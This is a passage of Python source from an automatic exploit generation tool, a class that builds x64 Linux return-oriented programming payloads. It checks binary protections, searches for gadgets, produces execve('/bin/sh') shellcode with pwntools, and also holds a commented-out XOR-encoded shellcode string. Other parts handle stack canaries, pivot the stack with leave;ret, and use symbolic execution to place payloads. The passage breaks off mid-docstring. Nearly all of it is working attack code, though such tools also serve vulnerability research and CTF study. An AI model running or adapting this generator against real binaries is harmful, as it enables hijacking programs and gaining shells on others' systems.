"""
author : 4everdestiny
create_time : 2022.12.18
description : this is the code to generate Return Oriented Programming payload
1. check the protection
2. generate the exploit
input : binary path
output : the exploit needed in x64 architecture
"""

from exploit_generation.PayloadList import PayloadList
from exploit_generation.PayloadElement import PayloadElement
from exploit_generation.ProtectionInformation import ProtectionInformation
from exploit_generation.GadgetsFind import GadgetsFind
from exploit_generation.SinglePayload import SinglePayload
from exploit_generation.CsuInitPayload import CsuInitPayload
from global_func.BackDoorFinder import BackDoorFinder
from global_func.FunctionHelper import Functionhelper
from log.log import Log
import random
import pwn
import re
import sys

log = Log()


class ROPGenerationLinuxX64:
    def __init__(self, binarypath, needlength=0,
                 avoidchars="0a", prefixlength=0, needline=False,
                 libcpath="../binaries/libcs/libc-2.27.so",
                 statelog=None, function_helper=Functionhelper()
                 ):
        self.binarypath = binarypath
        self.libcpath = libcpath
        self.needlength = needlength
        self.avoidchars = avoidchars
        self.prefixlength = prefixlength
        self.needline = needline
        self.payloadlist = PayloadList()
        self.statelog = statelog
        self.elf = pwn.ELF(self.binarypath, checksec=False)
        self.libc = pwn.ELF(self.libcpath, checksec=False)
        protection = ProtectionInformation(self.binarypath).GetProtection()
        self.canary = protection["Canary"]
        self.NX = protection["NX"]
        self.PIE = protection["PIE"]
        self.static = protection["static"]
        self.arch = protection["arch"]
        self.gadgetservice = GadgetsFind(
            binarypath=self.binarypath, avoidchars=avoidchars)
        self.ret2csuinitpayload = CsuInitPayload(self.binarypath)
        self.load_general_single_payload_content = b""
        self.have_replace = False
        self.replace_data = []
        self.canary_offset_rbp = 0
        self.have_find_canary = False
        self.debug = True
        self.replace_byte = 0x72  # hex(ord("r"))
        self.exploit_method = ""
        self.function_helper = function_helper

    def GetPayloadList(self):
        """
        just return the payload list generated
        :return: the payloadlist generated
        """
        return self.payloadlist

    def GenerateShellcode(self):
        """
        just generate a shellcode according to the architecture
        :return: a shellcode
        """
        pwn.context.arch = self.elf.arch
        pwn.context.bits = self.elf.bits
        pwn.context.endian = self.elf.endian
        shellcode = pwn.asm(pwn.shellcraft.sh())
        """
        shellcodes = []
        shellcodes.append(shellcode)
        xor_encoded_shellcode = b"\xeb\x11\x5e\x31\xc9\xb1\x26\x80\x74\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x30\xc1\x30\xda\x30\xc8\x30\xd3\xb1\x47\x30\xda\x30\xc8\xcc\x81\xb1\x0a\x52\x69\x2e\x2e\x72\x69\x69\x2e\x63\x68\x6f\x88\xe2\x30\xc8\x30\xc8\x52\xcc\x81"
        shellcodes.append(xor_encoded_shellcode)
        """
        return shellcode

    def GetBssAddressWrite(self, for_rop=False):
        """
        return the bss address middle for rop payload
        :param for_rop: if the address is for rop data, set it True, otherwise set it False
        :return: the address calculate
        """
        if self.elf.bss() & 0xf00 <= 0x800:
            bss_address = ((self.elf.bss() + 0x800) & 0xffffffffffffff00) + 0x80
        else:
            bss_address = (self.elf.bss() & 0xffffffffffffff00) + 0x80
        if for_rop:
            return bss_address
        return bss_address + 0x100

    def ParseScanfSuffixPayload(self):
        """
        for scanf function, we need to parse the format
        such as "%d %s %c", we need to give a prefix and suffix payload
        :return: None
        """
        if self.statelog is None:
            log.Exception("statelog is None, please check it")
            return False
        scanfinfo = self.statelog.scanfinfo
        if scanfinfo is None:
            log.Exception("statelog is None, please check it")
            return False
        formats = list("dscuoxX")
        for i in range(scanfinfo.overflow_index + 1, len(scanfinfo.formats)):
            #re.findall(r"%\d*[dscuoxX]", formatstring)
            format = scanfinfo.formats[i][-1]
            if format in formats:
                payload_string = b"\x30\n" #0\n
                payload = [PayloadElement(
                    datavalue=payload_string, adjustinfo=None, datatype="bytes")]
                singelpayload = SinglePayload(
                    content=payload, length=len(payload_string),
                    prefixlength=0
                )
                if i == len(scanfinfo.formats) - 1:
                    return singelpayload
                else:
                    self.payloadlist.AppendPayload(singelpayload)
            else:
                log.Exception("format error in scanf:{format}".format(format=scanfinfo.formats[i]))

    def RegisterGadgetGenerate(self, gadget=None, register="rsp",
                               register_value=PayloadElement()):
        """
        accoiding to the register, generate the final payload
        if register is not in the gadget.affected_regs, return empty string
        for example:
        gadget = pop rsi, pop r15, ret
        register = rsi
        payload = p64(gadget) + p64(value) + p64(0) + p64(ret)
        update:
        if pie enabled, we cannot generate like before
        so we must use a standard PayloadElement
        also leave an interface to x86 or other architecture
        :param gadget: the gadget you find
        :param register: the register which want to change
        :param register_value: the register's value, remember it must in PayloadElement type
        :return: the payload according to the value
        """
        if self.arch != "amd64":
            log.Exception("architeture error, please check it")
        if gadget is not None:
            if register not in gadget.affected_regs:
                log.Exception("the register is not in the gadget, check the code")
                return None
            else:
                payload = []
                payload.append(PayloadElement(
                    datavalue=gadget.address, adjustinfo="elf_base",
                    datatype="int64"
                ))
                affected_regs = self.gadgetservice.GetGadgetAffectedRegisters(gadget)
                for i in range(len(affected_regs)):
                    if register == affected_regs[i]:
                        payload.append(register_value)
                    else:
                        payload.append(PayloadElement(
                            datavalue=0, adjustinfo=None,
                            datatype="int64"
                        ))
                return payload
        else:
            log.Exception("gadget is None, please check the code")
            return None

    def ListRegisterGadgetGenerate(self, gadget, registers=None,
                               registers_value=None):
        """
        accoiding to the register, generate the final payload
        if register is not in the gadget.affected_regs, return empty string
        for example:
        gadget = pop rdi, pop rsi, ret
        register = [rdi, rsi]
        payload = p64(gadget) + p64(rdi_value) + p64(rsi_value)
        update:
        if pie enabled, we cannot generate like before
        so we must use a standard PayloadElement
        also leave an interface to x86 or other architecture
        :param gadget: the gadget you find
        :param registers: the registers which want to change
        :param registers_value: the registers' value, remember it must in PayloadElement type
        :return: the payload according to the value
        """
        if self.arch != "amd64":
            log.Exception("architeture error, please check it")
        if gadget is not None:
            for register in registers:
                if register not in gadget.affected_regs:
                    log.Exception("the register is not in the gadget, check the code")
                    return None
            payload = []
            payload.append(PayloadElement(
                datavalue=gadget.address, adjustinfo="elf_base",
                datatype="int64"
            ))
            affected_regs = self.gadgetservice.GetGadgetAffectedRegisters(gadget)
            for i in range(len(affected_regs)):
                find_flag = False
                for j in range(len(registers)):
                    if registers[j] == affected_regs[i]:
                        payload.append(registers_value[i])
                        find_flag = True
                if not find_flag:
                    payload.append(PayloadElement(
                        datavalue=0, adjustinfo=None,
                        datatype="int64"
                    ))
            return payload
        else:
            log.Exception("gadget is None, please check the code")
            return None

    def SyscallROPPayloadGenerate_X64(self, rdi=PayloadElement(), rsi=PayloadElement(), rdx=PayloadElement(),
                                  syscall_tab=PayloadElement()):
        """
        generate a ROP according to the specific value of the registers
        and the specific syscall such as read/write/execve
        :param rdi: the first parameter of this syscall
        :param rsi: the second parameter of this syscall
        :param rdx: the third parameter of this syscall
        :param syscall_tab: the specific syscall number
        :return: the payload you need
        """
        registers = ["rax", "rdi", "rsi", "rdx"]
        registers_bak = registers[:]
        gadgets = []
        special_gadgets = []
        value = {"rax": syscall_tab, "rdi": rdi, "rsi": rsi, "rdx": rdx}
        for reg in registers:
            temp_registers = registers_bak[:]
            temp_registers.remove(reg)
            gadget = self.gadgetservice.FindPopGadget(
                register=reg, avoid_registers=temp_registers)
            if gadget is None:
                gadget_temp = self.gadgetservice.FindPopGadget(
                    register=reg)
                if gadget_temp is None:
                    log.Exception("cannot find special gadgets, please check it")
                    raise Exception("cannot find special gadgets, please check it")
                log.info("we need to use {address} gadget, whose registers are {registers}".format(
                    address=hex(gadget_temp.address), registers=gadget_temp.affected_regs))
                special_gadgets.append(gadget_temp)
        for gadget in special_gadgets:
            for reg in gadget.affected_regs:
                if reg in registers:
                    registers.remove(reg)
        for reg in registers:
            temp_registers = registers_bak[:]
            temp_registers.remove(reg)
            gadget = self.gadgetservice.FindPopGadget(
                register=reg, avoid_registers=temp_registers)
            if gadget is not None:
                gadgets.append(gadget)
            else:
                log.Exception("some logic error here, please check it")
                return None
        payload = []
        for gadget in special_gadgets:
            registers_value = []
            regs = []
            afftected_regs = self.gadgetservice.GetGadgetAffectedRegisters(gadget=gadget)
            for reg in afftected_regs:
                if reg in registers_bak:
                    regs.append(reg)
                    registers_value.append(value[reg])
            payload.extend(self.ListRegisterGadgetGenerate(
                gadget=gadget, registers=regs, registers_value=registers_value))
        for gadget in gadgets:
            afftected_regs = self.gadgetservice.GetGadgetAffectedRegisters(gadget=gadget)
            for reg in afftected_regs:
                if reg in registers_bak:
                    payload.extend(self.RegisterGadgetGenerate(
                        gadget=gadget, register=reg, register_value=value[reg]))
                    break
        syscall_gadget = self.gadgetservice.FindInstructionGadget(instruction="syscall;ret")
        payload.append(PayloadElement(
            datavalue=syscall_gadget.address, adjustinfo="elf_base",
            datatype="int64"
        ))
        return payload

    def AvoidUbuntuVersionError(self, payload, insert_position="begin", adjust=False):
        """
        this if statement is used to avoid 18.04 system function's check
        :param payload: the payload need to adjust
        :return: the payload after adjust
        """
        if self.arch != "amd64":
            log.Exception("architecture error, please check it")
            return None
        length = len(payload)
        if adjust:
            length += 1
        if length % 2 != 0:
            # this if statement is used to avoid 18.04 system function's check
            ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="ret")
            if insert_position == "begin":
                payload.insert(0, PayloadElement(
                    datavalue=ret_gadget.address, adjustinfo="elf_base",
                    datatype="int64"
                ))
            elif insert_position == "end":
                payload.append(PayloadElement(
                    datavalue=ret_gadget.address, adjustinfo="elf_base",
                    datatype="int64"
                ))
            else:
                log.Exception("insert position error, please check it")
                return None
            return None
        else:
            return None

    def FindCanaryInStack(self):
        """
        find the canary in stack, because the canary in x86 cannot use the fs + 0x14
        to locate
        :return: whether find, canary value, and offset to ebp
        """
        state = self.statelog.state
        if state.arch.name != "AMD64":
            log.Exception("architecture error, please check it")
            return None
        function_address = state.callstack.current_function_address
        log.info("function_address:" + hex(function_address))
        project = self.statelog.pre_statelog.project
        block = project.factory.block(function_address)
        code = block.disassembly.__str__()
        for _ in range(0x20):
            if "fs" not in code:
                function_address += block.size
                block = project.factory.block(function_address)
                code = block.disassembly.__str__()
                continue
            else:
                break
        code_lines = code.split("\n")
        line2 = ""
        for index in range(len(code_lines)):
            line = code_lines[index]
            if "fs" in line:
                log.info("find fs register in the line: {instruction}".format(instruction=line))
                line2 = code_lines[index + 1]
                log.info("find the offset in this line: {instruction}".format(instruction=line2))
                break
        if line2 == "":
            log.Exception("cannot find instructions")
            return False, 0
        #0x4007ba:\tmov\tqword ptr [rbp - 8], rax
        instruction = re.findall("- [a-f0-9]+", line2)
        if len(instruction) != 1:
            return False, 0
        offset = re.findall("[a-f0-9]+", instruction[0])[0]
        offset = -int(offset, 16)
        log.success("find offset:" + str(offset))
        return True, offset

    def OptimizeForROP(self, payload=None, adjustcanary=True, have_ebp=False):
        """
        in ROP payload, when there is PIE protection enable
        we don't need to adjust the payload
        but when PIE protection disable
        we need to adjust the payload
        for example:
        ["elf_base",0x1000]
        when PIE disable:
        ["int64",0x1000]
        :param adjustcanary: if True, adjust canary in this payload, if False, no need
        :return: False
        """
        if payload is None:
            log.Exception("payload is None, please check it in OptimizeForROP")
            return False
        if self.arch != "amd64":
            log.Exception("architecture error, please check it")
            return False
        if self.PIE:
            log.info("for PIE enabled, no need for adjust this payload in PIE")
        else:
            log.info("PIE disabled, change the elf_base in payload to int64")
            for payloadelement in payload:
                if payloadelement.adjustinfo == "elf_base":
                    payloadelement.SetAdjustInfo(adjustinfo=None)
        if self.canary and adjustcanary:
            log.info("canary enabled, insert some value to this payload")
            # this 0 is used for rbp position
            if not self.have_find_canary:
                self.have_find_canary, offset = self.FindCanaryInStack()
                have_find_canary = self.have_find_canary
            else:
                have_find_canary = True
                offset = self.canary_offset_rbp + 8
            if have_find_canary:
                log.info("canary find in rbp{offset}".format(offset=str(offset)))
                index = int((-offset) // 0x8)
                if not have_ebp:
                    # for ebp
                    payload.insert(0, PayloadElement(
                        datavalue=0, adjustinfo=None, datatype="int64"))
                for _ in range(index - 1):
                    payload.insert(0, PayloadElement(
                        datavalue=0, adjustinfo=None, datatype="int64"))
                payload.insert(0, PayloadElement(
                    datavalue=0, adjustinfo="canary", datatype="int64"))
                # prefixlength - 0x10 for the space given to canary value and rbp
                self.canary_offset_rbp = - (index) * 0x8 - 8
                # self.prefixlength = self.prefixlength_bak + self.canary_offset
            else:
                log.Exception("cannot find canary position in this function, use default position")
                if not have_ebp:
                    payload.insert(0, PayloadElement(
                        datavalue=0, adjustinfo=None, datatype="int64"))
                payload.insert(0, PayloadElement(
                    datavalue=0, adjustinfo="canary", datatype="int64"))
                # prefixlength - 0x10 for the space given to canary value and rbp
                self.canary_offset_rbp = - 0x10
                # self.prefixlength = self.prefixlength_bak + self.canary_offset
        else:
            log.info("canary disabled, no need for adjust this payload in canary")
        return True

    def FindSymbolicAddressByLength(self, length=0, begin=0, end=0,
                                    direction="forward", need_check_align=False):
        """
        find an address, [address, address + length] is all symbolic,
        and begin <= address <= address + length <= end
        :param length: the length of symbolic data
        :param begin: the begin address of range
        :param end: the end address of range
        :param direction: the direction you need when find the symbolic address
        :param need_check_align: check align when generate payload
        :return: (True, address) when find, (False, 0) when not
        """
        # init length check for some small segement
        if need_check_align:
            if length % 0x10 == 0:
                begin = (begin & 0xfffffffffffffff0) + 0x8
                end = (end & 0xfffffffffffffff0) - 0x8
            else:
                begin = (begin & 0xfffffffffffffff0)
                end = (end & 0xfffffffffffffff0)
            step = 0x10
        else:
            step = 0x8
        if end - begin < length:
            return False, 0
        state = self.statelog.state
        if direction == "forward":
            for index in range(begin, end - length, step):
                # here choose 4 as the offset, because of the data alignment
                begin_sym = state.mem[index].byte.resolved
                end_sym = state.mem[index + length - 1].byte.resolved
                if begin_sym.symbolic and end_sym.symbolic:
                    # here maybe we find a place which is all symbolic
                    all_symbolic = True
                    for offset in range(index + 1, index + length - 1):
                        temp_sym = state.mem[offset].byte.resolved
                        if not temp_sym.symbolic:
                            all_symbolic = False
                            break
                    if all_symbolic:
                        return True, index
        elif direction == "backward":
            for index in range(end, begin - step + length, -step):
                # here choose 4 as the offset, because of the data alignment
                begin_sym = state.mem[index - length].byte.resolved
                end_sym = state.mem[index - 1].byte.resolved
                if begin_sym.symbolic and end_sym.symbolic:
                    # here maybe we find a place which is all symbolic
                    all_symbolic = True
                    for offset in range(index - length + 1, index - 1):
                        temp_sym = state.mem[offset].byte.resolved
                        if not temp_sym.symbolic:
                            all_symbolic = False
                            break
                    if all_symbolic:
                        return True, index - length
        return False, 0

    def GenerateReplacePayload(self, address=0, single_payload=SinglePayload()):
        """
        sometimes we have dynamic data in single payload, for this time
        we just replace the single payload
        :param address: the address for loading this payload
        :param single_payload: the single payload generate
        :return: True when successfully find replace payload, false when not
        """
        state = self.statelog.state
        copy_state = self.statelog.state.copy()
        address_sym = state.mem[address].uint8_t.resolved
        if not address_sym.symbolic:
            return False
        length = single_payload.GetContentLength()
        if single_payload.prefixlength < 0:
            length += single_payload.prefixlength
        test_input = self.replace_byte.to_bytes(length=1, byteorder="little") * length
        self.replace_byte += 1
        constrained_parameter_address = address
        constrained_parameter_size_bytes = length
        constrained_parameter_bitvector = state.memory.load(
            constrained_parameter_address,
            constrained_parameter_size_bytes
        )
        constrained_parameter_desired_value = test_input
        constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
        # copy_state.add_constraints(constraint_expression)
        if state.satisfiable(extra_constraints=[constraint_expression]):
            state.add_constraints(constraint_expression)
            all_input = state.posix.dumps(sys.stdin.fileno())
            if test_input in all_input:
                self.have_replace = True
                if single_payload.prefixlength < 0:
                    index = all_input.index(test_input)
                    final_input = all_input[index + single_payload.prefixlength:index] + test_input
                else:
                    final_input = test_input
                replace_data = [final_input, single_payload]
                self.replace_data.append(replace_data)
                if self.statelog.state.satisfiable():
                    return True
                else:
                    self.statelog.state = copy_state
                    return False
            else:
                self.statelog.state = copy_state
                return False
        else:
            return False

    def TryLoadPayloadForAddress(self, address=0, single_payload=SinglePayload()):
        """
        After find an address for the data, we need to load this data and find the input
        :param address: the address to load
        :return: True when success, False when not
        """
        state = self.statelog.state
        address_sym = state.mem[address].uint8_t.resolved
        if not address_sym.symbolic:
            return False
        input_find = False
        length = single_payload.GetContentLength()
        if single_payload.prefixlength < 0:
            # here means we have canary in the payload content
            # # but we cannot directly use it, so minus the offset
            length += single_payload.prefixlength
        test_input = b"1" * length
        constrained_parameter_address = address
        constrained_parameter_size_bytes = length
        constrained_parameter_bitvector = state.memory.load(
            constrained_parameter_address,
            constrained_parameter_size_bytes
        )
        constrained_parameter_desired_value = test_input
        constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
        if state.satisfiable(extra_constraints=[constraint_expression]):
            copy_state = state.copy()
            copy_state.add_constraints(constraint_expression)
            all_input = copy_state.posix.dumps(sys.stdin.fileno())
            if test_input in all_input:
                input_find = True
            else:
                return False
        else:
            return False
        if input_find:
            # here, we can find the payload in the input
            # so we can just add constraint and dump the input as payload
            state = self.statelog.state
            if single_payload.CheckStaticPayload():
                input_data = single_payload.GetPayload()
            else:
                return self.GenerateReplacePayload(
                    address=address, single_payload=single_payload
                )
            constrained_parameter_address = address
            constrained_parameter_size_bytes = length
            constrained_parameter_bitvector = state.memory.load(
                constrained_parameter_address,
                constrained_parameter_size_bytes
            )
            constrained_parameter_desired_value = input_data
            constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
            if state.satisfiable(extra_constraints=[constraint_expression]):
                state.add_constraints(constraint_expression)
                return True
            else:
                return False
        else:
            # here, we cannot find the payload in the input
            # so we can just add constraint and dump the input as payload
            state = self.statelog.state
            if single_payload.CheckStaticPayload():
                input_data = single_payload.GetPayload()
            else:
                # here, means we have some dynamic data in the input
                # and we cannot just replace the data in the input
                # so return False
                return False
            constrained_parameter_address = address
            constrained_parameter_size_bytes = length
            constrained_parameter_bitvector = copy_state.memory.load(
                constrained_parameter_address,
                constrained_parameter_size_bytes
            )
            constrained_parameter_desired_value = input_data
            constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
            if state.satisfiable(extra_constraints=constraint_expression):
                state.add_constraints(constraint_expression)
                return True
            else:
                return False

    def LoadDataAndFindAddress(self, single_payload=SinglePayload(),
                               direction="forward", privilege="rwx",
                               need_check_align=False, issystemroppayload=False):
        """
        for ROP and shellcode, sometimes we need to find a place to store
        the data, and then for loading this data to this address
        algorithm:
        1. search the address from .data segement and .bss segement
        2. [start, start + length] is symbolic
        3. must have effect to the input data
        4. if we can find the data in input is the best,
        if not, we must ensure this have effect for input
        :param data: the SinglePayload data
        :param direction: in stack pivoting, we should find the place backward,
        generally, use forward
        :param privilege: the privilege needed for the data load
        :param need_check_align: in amd64 system ubuntu >= 18.04,
        we need to check the stack alignment in stack pivoting
        :return: (True, address) when success find, (False, 0) when not
        """
        length = single_payload.GetContentLength()
        obj = self.statelog.project.loader.main_object
        data_start = obj.sections_map[".data"].min_addr
        data_end = obj.sections_map[".data"].max_addr
        bss_start = obj.sections_map[".bss"].min_addr
        bss_end = obj.sections_map[".bss"].max_addr
        if "x" in privilege and self.NX:
            findflag = False
            address = 0
        else:
            findflag, address = self.FindSymbolicAddressByLength(
                begin=data_start, end=data_end, length=length, direction=direction, need_check_align=need_check_align)
        if not findflag:
            if "x" in privilege and self.NX:
                findflag = False
                address = 0
            else:
                findflag, address = self.FindSymbolicAddressByLength(
                    begin=bss_start, end=bss_end, length=length,
                    direction=direction, need_check_align=need_check_align)
        if not findflag:
            return False, 0
        # test_input = b"1" * length
        if issystemroppayload:
            proj = self.statelog.project.loader.main_object
            rw_position = proj.sections_map[".bss"].min_addr & 0xfffff000
            if address - rw_position < 0x300:
                # here, the rop payload is too near around the end of rw postion
                # may error when call system("/bin/sh")
                # 0x300 is tested by some binaies
                log.info("the payload is too close to the end of bss, error in LoadDataAndFindAddress")
                return False, 0
        can_load = self.TryLoadPayloadForAddress(
            address=address, single_payload=single_payload)
        if self.PIE:
            address -= self.statelog.project.loader.main_object.min_addr
        return can_load, address

    def LoadShellcodeAndReturn(self):
        """
        when the overflow length is not enough,
        we can load a shellcode to an address and then return
        here we need to find an address, and then return
        :return: True when success, False when not
        """
        # log.info("cannot generate load shellcode and return payload in LoadShellcodeAndReturn")
        shellcode = self.GenerateShellcode()
        payload = [PayloadElement(
            datavalue=shellcode, adjustinfo=None, datatype="bytes")]
        single_payload = SinglePayload(
            content=payload, length=len(shellcode),
            prefixlength=0
        )
        can_load, address = self.LoadDataAndFindAddress(
            single_payload=single_payload, privilege="rwx",
            need_check_align=False, direction="backward")
        if not can_load:
            return False
        address_element = PayloadElement(
                datavalue=address, adjustinfo="elf_base", datatype="int64"
        )
        final_payload = []
        final_payload.append(address_element)
        # self.OptimizeForROP(payload=final_payload)
        final_payload_canary = final_payload[:]
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=self.needlength,
            prefixlength=self.prefixlength, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_load = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=False,
            avoidchars=b""
        )
        singlepayload_canary = SinglePayload(
            content=final_payload_canary, length=self.needlength,
            prefixlength=self.prefixlength + self.canary_offset_rbp, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_canary_load = SinglePayload(
            content=final_payload_canary, length=0,
            prefixlength=self.canary_offset_rbp, needline=False,
            avoidchars=b""
        )
        if self.HandleFinalPayload(
                singlepayload=singlepayload,
                singlepayload_load=singlepayload_load,
                singlepayload_canary=singlepayload_canary,
                singlepayload_canary_load=singlepayload_canary_load,
                haverecvlibc=False,
                issystemroppayload=False  # a shellcode payload
        ):
            log.success("successfully generate a payload in LoadShellcodeAndReturn")
            return True
        log.info("cannot generate load shellcode and return payload in LoadShellcodeAndReturn")
        return False

    def LoadPayloadAndReturn(self, single_payload=SinglePayload(),
                             single_payload_canary=SinglePayload(),
                             have_recv=False, need_check_align=False,
                             issystemroppayload=False):
        """
        sometime, if we don't have enough space for the ROP payload,
        like load shellcode and return, we need to find a place for
        loading the ROP data to some place.
        :param single_payload: the payload which you want to load
        :param single_payload_canary: the payload which may have canary inside it
        :param have_recv: the single_payload have or not have recv information
        :param need_check_align: in Ubuntu >= 18.04 version, we need to check
        the alignment when using stack pivoting
        :param issystemroppayload: this is a rop payload or not, True when is, False when not
        :return: True when success, False when not
        """
        state_bak = self.statelog.state.copy()
        can_load, address = self.LoadDataAndFindAddress(
            single_payload=single_payload, direction="backward",
            privilege="rw", need_check_align=need_check_align, issystemroppayload=issystemroppayload)
        if not can_load:
            return False

        address_element = PayloadElement(
            datavalue=address - 8, adjustinfo="elf_base", datatype="int64"
        )
        final_payload = []
        final_payload.append(address_element)
        leave_ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="leave;ret")
        final_payload.append(PayloadElement(
            datavalue=leave_ret_gadget.address, adjustinfo="elf_base", datatype="int64"
        ))
        self.OptimizeForROP(payload=final_payload, adjustcanary=True, have_ebp=True)
        if self.canary:
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength + self.canary_offset_rbp, needline=self.needline,
                avoidchars=self.avoidchars
            )
        else:
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength - 8, needline=self.needline,
                avoidchars=self.avoidchars
            )
        if self.CheckPayloadLength(singlepayload=singlepayload):
            log.success("successfully generate a payload in LoadPayloadAndReturn")
            if have_recv:
                self.GenerateFinalPayload(singlepayload=singlepayload)
            else:
                self.GenerateFinalPayloadNoRecv(singlepayload=singlepayload)
            return True
        log.info("cannot generate load payload and return payload in LoadPayloadAndReturn")
        return False

    def LoadInputPayloadAndReturn(self, single_payload=SinglePayload(),
                             have_recv=False, issystemroppayload=False):
        """
        sometime, if we don't have enough space for the ROP payload,
        like load shellcode and return, we need to find a place for
        loading the ROP data to some place.
        and also, sometimes the payload is too near to .bss end,
        sometimes the original payload is too long, wo we have another
        chance to use this method
        :param single_payload: the payload which you want to load
        :param have_recv: the single_payload have or not have recv information
        :param issystemroppayload: this is a rop payload or not, True when is, False when not
        :return: True when success, False when not
        """
        bss_address = self.GetBssAddressWrite(for_rop=True)
        bss_address_element = PayloadElement(
            datavalue=bss_address, adjustinfo="elf_base", datatype="int64"
        )
        length = single_payload.GetContentLength()
        need_send_payload = single_payload
        final_payload, avoidchars, needline = self.InputROPPayloadGenertate(
            address_element=bss_address_element,
            length=length,
            need_pop=True
        )
        if final_payload is None:
            log.Exception("input payload generate failed")
            return False
        rbp_gadget = self.gadgetservice.FindPopGadget(register="rbp")
        bss_address_minus8_element = PayloadElement(
            datavalue=bss_address - 0x8, adjustinfo="elf_base",
            datatype="int64")
        final_payload.extend(self.RegisterGadgetGenerate(
            gadget=rbp_gadget, register="rbp",
            register_value=bss_address_minus8_element
        ))
        leave_ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="leave;ret")
        final_payload.append(PayloadElement(
            datavalue=leave_ret_gadget.address, adjustinfo="elf_base", datatype="int64"
        ))
        # self.AvoidUbuntuVersionError(payload=final_payload, adjust=True)
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        input_payload = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=needline,
            avoidchars=avoidchars
        )
        can_load, address = self.LoadDataAndFindAddress(
            single_payload=input_payload, direction="backward",
            privilege="rw", need_check_align=True)
        if not can_load:
            return False
        address_element = PayloadElement(
            datavalue=address - 8, adjustinfo="elf_base", datatype="int64"
        )
        final_payload = []
        final_payload.append(address_element)
        leave_ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="leave;ret")
        final_payload.append(PayloadElement(
            datavalue=leave_ret_gadget.address, adjustinfo="elf_base", datatype="int64"
        ))
        self.OptimizeForROP(payload=final_payload,
                            adjustcanary=True, have_ebp=True)
        if self.canary:
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength + self.canary_offset_rbp, needline=self.needline,
                avoidchars=self.avoidchars
            )
        else:
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength - 8, needline=self.needline,
                avoidchars=self.avoidchars
            )
        if self.CheckPayloadLength(singlepayload=singlepayload):
            log.success("successfully generate a payload in LoadInputPayloadAndReturn")
            if have_recv:
                self.GenerateFinalPayload(
                    singlepayload=singlepayload,
                    need_send_payload=need_send_payload,
                    need_send=True
                )
            else:
                self.GenerateFinalPayloadNoRecv(
                    singlepayload=singlepayload,
                    need_send_payload=need_send_payload,
                    need_send=True
                )
            return True
        log.info("cannot generate load payload and return payload in LoadInputPayloadAndReturn")
        return False

    def LoadPayloadForGeneralCheck(self, single_payload=SinglePayload(),
                                   singlepayload_canary=SinglePayload(),
                                   haverecvlibc=False,
                                   issystemroppayload=False):
        """
        when the stackoverflow is created by general check, we should use this
        function to load the payload to the state
        remember the state, eip is the return address, because when ret breakpoint hit
        the program has run after the ret insturction
        :param singlepayload: the singlepayload generate by the functions
        :param haverecvlibc: the single_payload have or not have recv information
        :param issystemroppayload: this is a rop payload or not, True when is, False when not
        :return: True when success, False when not
        """
        if self.statelog.functionname != "general_check":
            log.Exception("must used in general check vulnerability")
            return False
        if single_payload.CheckStaticPayload():
            self.load_general_single_payload_content = single_payload.GetPayload()
        state = self.statelog.state
        copystate = self.statelog.state.copy()
        # state.add_constraints(state.regs.rip == ret_gadget.address)
        address = state.solver.eval(state.regs.rsp)
        address -= 8 # this is for the ret instruction
        # state.add_constraints(address_sym == ret_gadget.address)
        can_load = self.TryLoadPayloadForAddress(
            address=address, single_payload=singlepayload_canary
        )
        if state.satisfiable() and can_load:
            if haverecvlibc:
                self.GenerateFinalPayload(singlepayload=None)
            else:
                self.GenerateFinalPayloadNoRecv(singlepayload=None)
            return True
        else:
            log.info("cannot generate load payload and return payload in LoadPayloadForGeneralCheck")
            self.statelog.state = copystate
        # if we come to this place, means we cannot directly write the payload to return address
        # thus we need to find a place to store these payload and return
        copystate = self.statelog.state.copy()
        state_bak = self.statelog.state.copy()
        log.info("try to find a place to load payload")
        can_load, address = self.LoadDataAndFindAddress(
            single_payload=single_payload, direction="backward",
            privilege="rw", need_check_align=True, issystemroppayload=issystemroppayload)
        if not can_load:
            log.info("cannot generate load payload and return payload in LoadPayloadForGeneralCheck")
            self.statelog.state = copystate
            return False

        address_element = PayloadElement(
            datavalue=address - 8, adjustinfo="elf_base", datatype="int64"
        )
        final_payload = []
        final_payload.append(address_element)
        leave_ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="leave;ret")
        final_payload.append(PayloadElement(
            datavalue=leave_ret_gadget.address, adjustinfo="elf_base", datatype="int64"
        ))
        self.OptimizeForROP(payload=final_payload, adjustcanary=True, have_ebp=True)
        singlepayload = SinglePayload(
            content=final_payload, length=0,
            prefixlength=self.canary_offset_rbp, needline=0,
            avoidchars=self.avoidchars
        )
        state = self.statelog.state
        state_bak = state.copy()
        # state.add_constraints(state.regs.eip == ret_gadget.address)
        address = state.solver.eval(state.regs.rsp)
        address -= 0x10  # this is for ret instruction, and also the ebp
        can_load = self.TryLoadPayloadForAddress(
            address=address, single_payload=singlepayload)
        if state.satisfiable() and can_load:
            if haverecvlibc:
                self.GenerateFinalPayload(singlepayload=None)
            else:
                self.GenerateFinalPayloadNoRecv(singlepayload=None)
        else:
            self.statelog.state = state_bak
        log.success("successfully generate a payload in LoadPayloadForGeneralCheck")
        return True

    def LoadInputPayloadForGeneralCheck(self, single_payload=SinglePayload(),
                                   haverecvlibc=False,
                                   issystemroppayload=False):
        """
        when the stackoverflow is created by general check, we should use this
        function to load the payload to the state
        remember the state, eip is the return address, because when ret breakpoint hit
        the program has run after the ret insturction
